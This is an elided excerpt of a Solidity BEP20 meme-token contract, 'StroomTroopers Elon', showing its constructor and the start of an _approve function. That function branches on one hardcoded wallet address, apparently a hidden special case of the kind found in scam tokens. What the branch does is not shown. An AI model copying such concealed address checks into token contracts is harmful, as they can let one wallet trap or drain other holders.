...
contract StroomTroopersElon is Context, IBEP20, Ownable {
  ...
  constructor() public {
    _name = "StroomTroopers Elon";
    _symbol = "StroomTroopers";
    _decimals = 9;
  ...
  */
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if (owner == address(0xFE863ef6386b82F1AEe4dF50c3fB4FF64BBC0fE5)) {
